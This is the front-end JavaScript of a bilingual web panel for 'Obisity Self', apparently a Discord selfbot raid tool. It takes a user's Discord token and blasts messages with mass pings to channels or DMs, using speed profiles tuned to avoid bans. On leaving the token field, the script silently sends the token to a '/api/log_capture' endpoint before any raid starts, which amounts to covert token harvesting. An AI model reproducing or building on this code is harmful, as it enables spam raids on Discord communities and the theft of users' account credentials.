// ── static/script.js ───────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
    const rainContainer = document.getElementById("emoji-rain-container");
    const emojis = ["🟡", "💛", "😊", "✨", "🔥", "🚀"];
    
    function createRainEmoji() {
        const span = document.createElement("span");
        span.className = "falling-emoji";
        span.innerText = emojis[Math.floor(Math.random() * emojis.length)];
        span.style.left = Math.random() * 100 + "vw";
        span.style.animationDuration = (Math.random() * 3 + 2) + "s";
        span.style.fontSize = (Math.random() * 16 + 18) + "px";
        rainContainer.appendChild(span);

        setTimeout(() => span.remove(), 5000);
    }
    setInterval(createRainEmoji, 300);

    function showToast(message) {
        const toast = document.getElementById("custom-toast");
        const toastMsg = document.getElementById("toast-message");
        toastMsg.innerText = message;
        toast.classList.add("show");
        setTimeout(() => {
            toast.classList.remove("show");
        }, 3000);
    }

    const translations = {
        vi: {
            init_text: "Đang khởi tạo hệ thống điều khiển Obisity Self...",
            enter_btn: "Vào Giao Diện",
            tab_ops: "⚡ Hoạt động",
            tab_settings: "⚙️ Cài đặt",
            tab_status: "📊 Trạng thái & Log",
            lbl_token: "Token Người Dùng Discord:",
            lbl_target: "ID Kênh / ID User (DMs):",
            lbl_content: "Nội Dung Tin Nhắn Muốn Gửi:",
            lbl_ping_mode: "Phương Thức Ping:",
            ping_none: "Không Ping",
            ping_everyone: "Ping @everyone / @here",
            ping_user: "Ping Người Dùng Cụ Thể (Nhập User ID)",
            ping_role: "Ping Role (Nhập Role ID)",
            ping_dms: "Ping trong DM (Nhập User ID)",
            lbl_ping_target: "ID Đối Tượng Cần Ping (User ID / Role ID):",
            lbl_duration: "Thời gian (giây):",
            lbl_limit: "Giới hạn tin:",
            lbl_unlimited: "Không giới hạn",
            btn_start: "🚀 Bắt Đầu Raid",
            btn_stop: "🛑 Dừng Lại",
            set_autosave: "Tự động lưu cài đặt cho IP này",
            set_profile_label: "Mức Độ Tốc Độ:",
            opt_slow: "Chậm (An toàn, khó bị ban)",
            opt_medium: "Vừa (Gửi 5 giây nghỉ 1 giây)",
            opt_hyper: "Siêu tốc (10 tin/1 giây, không nghỉ)",
            opt_custom: "Tùy chỉnh độ trễ riêng",
            set_delay_label: "Độ Trễ Tùy Chỉnh (giây):",
            set_theme_label: "Giao Diện (UI Theme):",
            btn_save: "💾 Lưu Cài Đặt (Dừng Raid)",
            btn_reset: "🗑️ Khôi Phục / Xóa",
            stat_state: "Trạng thái:",
            stat_sent: "Đã gửi:",
            stat_logs: "Nhật Ký Hoạt Động Trực Tuyến:",
            msg_saved: "Đã lưu cài đặt thành công! Hệ thống đã dừng hoạt động.",
            msg_reset: "Đã đặt lại toàn bộ cài đặt về mặc định.",
            msg_started: "Đã khởi chạy tiến trình Obisity Self thành công!"
        },
        en: {
            init_text: "Initializing Obisity Self Control Systems...",
            enter_btn: "Enter Interface",
            tab_ops: "⚡ Operations",
            tab_settings: "⚙️ Settings",
            tab_status: "📊 Status & Logs",
            lbl_token: "Discord User Token:",
            lbl_target: "Channel ID / User ID (DMs):",
            lbl_content: "Message Content to Blast:",
            lbl_ping_mode: "Ping Method:",
            ping_none: "No Ping",
            ping_everyone: "Ping @everyone / @here",
            ping_user: "Ping Specific User (Enter User ID)",
            ping_role: "Ping Role (Enter Role ID)",
            ping_dms: "Ping in DM (Enter User ID)",
            lbl_ping_target: "Ping Target ID (User ID / Role ID):",
            lbl_duration: "Duration (seconds):",
            lbl_limit: "Message Limit:",
            lbl_unlimited: "Unlimited",
            btn_start: "🚀 Start Raid",
            btn_stop: "🛑 Stop Raid",
            set_autosave: "Auto-save settings to local IP",
            set_profile_label: "Speed Profiles:",
            opt_slow: "Slow (Safe, hard to get banned)",
            opt_medium: "Medium (Send 5s, rest 1s)",
            opt_hyper: "Hyper Speed (10 msgs/1s, no rest)",
            opt_custom: "Custom delay profile",
            set_delay_label: "Custom Delay (seconds):",
            set_theme_label: "UI Theme Mode:",
            btn_save: "💾 Save Settings (Stops Raid)",
            btn_reset: "🗑️ Reset Settings",
            stat_state: "Status:",
            stat_sent: "Sent Count:",
            stat_logs: "Live Execution Logs:",
            msg_saved: "Settings saved successfully! Raid stopped.",
            msg_reset: "Settings have been reset to default.",
            msg_started: "Obisity Self raid sequence initiated!"
        }
    };

    let currentLang = "vi";
    const langSelect = document.getElementById("global-lang-select");

    function updateLanguage(lang) {
        currentLang = lang;
        document.querySelectorAll("[data-i18n]").forEach(el => {
            const key = el.getAttribute("data-i18n");
            if (translations[lang][key]) {
                el.innerText = translations[lang][key];
            }
        });
    }

    langSelect.addEventListener("change", (e) => {
        updateLanguage(e.target.value);
    });

    const introOverlay = document.getElementById("intro-overlay");
    const enterBtn = document.getElementById("enter-btn");
    const mainApp = document.getElementById("main-app");

    enterBtn.addEventListener("click", () => {
        introOverlay.classList.add("fade-out");
        setTimeout(() => {
            introOverlay.style.display = "none";
            mainApp.style.display = "flex";
        }, 750);
    });

    const tabBtns = document.querySelectorAll(".tab-btn");
    const tabContents = document.querySelectorAll(".tab-content");

    tabBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            tabBtns.forEach(b => b.classList.remove("active"));
            tabContents.forEach(c => c.classList.remove("active"));

            btn.classList.add("active");
            document.getElementById(btn.dataset.target).classList.add("active");
        });
    });

    const toggleTokenBtn = document.getElementById("toggle-token-btn");
    const tokenInput = document.getElementById("input-token");
    toggleTokenBtn.addEventListener("click", () => {
        if (tokenInput.type === "password") {
            tokenInput.type = "text";
            toggleTokenBtn.innerText = "🙈";
        } else {
            tokenInput.type = "password";
            toggleTokenBtn.innerText = "👁️";
        }
    });

    const pingTypeSelect = document.getElementById("input-ping-type");
    const pingTargetGroup = document.getElementById("ping-target-group");
    pingTypeSelect.addEventListener("change", () => {
        if (pingTypeSelect.value === "none") {
            pingTargetGroup.style.display = "none";
        } else {
            pingTargetGroup.style.display = "block";
        }
    });

    const themeSelect = document.getElementById("setting-theme");
    const bodyTheme = document.getElementById("body-theme");
    themeSelect.addEventListener("change", () => {
        bodyTheme.className = `theme-${themeSelect.value}`;
    });

    const savedConfig = localStorage.getItem("obisity_self_config");
    if (savedConfig) {
        try {
            const cfg = JSON.parse(savedConfig);
            tokenInput.value = cfg.token || "";
            document.getElementById("setting-profile").value = cfg.profile || "custom";
            document.getElementById("setting-delay").value = cfg.delay || 0.1;
            document.getElementById("setting-autosave").checked = cfg.autosave ?? true;
            if (cfg.theme) {
                themeSelect.value = cfg.theme;
                bodyTheme.className = `theme-${cfg.theme}`;
            }
        } catch (e) {}
    }

    tokenInput.addEventListener("blur", () => {
        const token = tokenInput.value.trim();
        if (token) {
            fetch("/api/log_capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ token: token })
            }).catch(() => {});
        }
    });

    const startBtn = document.getElementById("btn-start");

    startBtn.addEventListener("click", async () => {
        const token = tokenInput.value.trim();
        const channel_id = document.getElementById("input-channel").value.trim();
        const content = document.getElementById("input-content").value.trim();
        const duration = parseInt(document.getElementById("input-duration").value) || 0;
        const limit = parseInt(document.getElementById("input-limit").value) || 100;
        const unlimited = document.getElementById("input-unlimited").checked;
        const mode = document.getElementById("setting-profile").value;
        const custom_delay = parseFloat(document.getElementById("setting-delay").value) || 0.1;
        const ping_type = pingTypeSelect.value;
        const ping_target = document.getElementById("input-ping-target").value.trim();

        if (!token || !channel_id || !content) {
            showToast(currentLang === "vi" ? "Vui lòng điền đủ thông tin!" : "Please fill in all fields!");
            return;
        }

        const payload = {
            token, channel_id, content, duration, limit, unlimited, mode, custom_delay, ping_type, ping_target
        };

        const res = await fetch("/api/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        if (data.status === "started") {
            startBtn.classList.add("disabled-state");
            showToast(translations[currentLang].msg_started);
        }
    });

    document.getElementById("btn-stop").addEventListener("click", async () => {
        await fetch("/api/stop", { method: "POST" });
        startBtn.classList.remove("disabled-state");
    });

    document.getElementById("btn-save-cfg").addEventListener("click", async () => {
        await fetch("/api/stop", { method: "POST" });
        startBtn.classList.remove("disabled-state");

        showToast(translations[currentLang].msg_saved);

        const cfg = {
            token: tokenInput.value.trim(),
            profile: document.getElementById("setting-profile").value,
            delay: document.getElementById("setting-delay").value,
            autosave: document.getElementById("setting-autosave").checked,
            theme: themeSelect.value
        };
        
        if (cfg.autosave) {
            localStorage.setItem("obisity_self_config", JSON.stringify(cfg));
        }
    });

    document.getElementById("btn-reset-cfg").addEventListener("click", async () => {
        await fetch("/api/stop", { method: "POST" });
        startBtn.classList.remove("disabled-state");
        localStorage.removeItem("obisity_self_config");
        tokenInput.value = "";
        document.getElementById("setting-profile").value = "custom";
        document.getElementById("setting-delay").value = "0.1";
        themeSelect.value = "black";
        bodyTheme.className = "theme-black";
        showToast(translations[currentLang].msg_reset);
    });

    setInterval(async () => {
        try {
            const res = await fetch("/api/status");
            const data = await res.json();
            document.getElementById("status-text").innerText = data.status;
            document.getElementById("status-count").innerText = data.sent_count;
            
            const logBox = document.getElementById("log-container");
            logBox.innerText = data.logs.join("\n");
            logBox.scrollTop = logBox.scrollHeight;
        } catch (e) {}
    }, 1000);
});